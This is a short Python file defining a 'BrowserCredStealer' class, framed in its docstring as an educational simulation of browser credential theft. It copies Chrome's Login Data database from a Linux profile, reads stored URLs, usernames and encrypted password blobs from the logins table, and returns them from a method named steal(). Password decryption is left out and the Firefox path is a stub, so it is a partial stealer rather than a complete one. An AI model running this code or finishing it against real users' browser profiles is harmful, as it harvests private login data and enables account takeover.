import os
import json
import sqlite3
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
from pathlib import Path

class BrowserCredStealer:
    """
    Educational simulation of browser credential extraction.
    Works on Chrome/Edge if you have decryption key (requires user interaction in real attacks).
    This is for understanding how such malware operates.
    """
    
    def __init__(self, browser='chrome'):
        self.browser = browser.lower()
        self.paths = {
            'chrome': {
                'login_db': os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
                'local_state': os.path.expanduser('~/.config/google-chrome/Local State')
            },
            'firefox': {
                'profile_dir': os.path.expanduser('~/.mozilla/firefox/*.default-release')
            }
        }
    
    def get_chrome_creds(self):
        # This is highly simplified; real decryption requires OS-level key
        # We're just demonstrating the structure
        if not os.path.exists(self.paths['chrome']['login_db']):
            return []
        
        # Copy DB to avoid locking
        shutil.copy(self.paths['chrome']['login_db'], '/tmp/login_db_copy')
        conn = sqlite3.connect('/tmp/login_db_copy')
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        creds = []
        for row in cursor.fetchall():
            # password_value is encrypted; need to decrypt with key from Local State
            # This is omitted for brevity and legality
            creds.append({
                'url': row[0],
                'username': row[1],
                'encrypted_password': base64.b64encode(row[2]).decode()
            })
        conn.close()
        os.remove('/tmp/login_db_copy')
        return creds
    
    def steal(self):
        if self.browser == 'chrome':
            return self.get_chrome_creds()
        else:
            return []